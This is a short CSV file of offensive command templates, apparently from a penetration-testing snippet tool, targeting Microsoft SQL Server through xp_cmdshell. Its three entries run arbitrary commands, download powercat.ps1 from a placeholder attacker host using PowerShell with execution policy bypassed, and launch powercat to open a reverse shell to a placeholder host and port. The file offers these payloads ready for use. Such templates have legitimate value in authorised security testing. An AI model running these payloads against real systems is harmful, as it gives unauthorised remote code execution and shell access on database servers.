name,description,snippet,variables
MsSQLExecuteCommand,MsSQL comamnd execution via xp_cmdshell,EXEC xp_cmdshell "§§§command§§§",§§§command§whoami§command that should be executed§§§
MsSQLExecuteCommandPsDownload,MsSQL comamnd execution via xp_cmdshell (download file via powershell),EXEC xp_cmdshell "powershell -ep bypass -nop iwr -uri ###HttpUri###§§§file§§§ -outfile §§§file§§§",§§§file§powercat.ps1§filename to download from host§§§
MsSQLExecutePowercat,MsSQL comamnd execution via xp_cmdshell (powercat connection to host),EXEC xp_cmdshell "powershell -ep bypass -nop . powercat.ps1; powercat -c ###LocalHost### -p ###LocalPort### -ep",
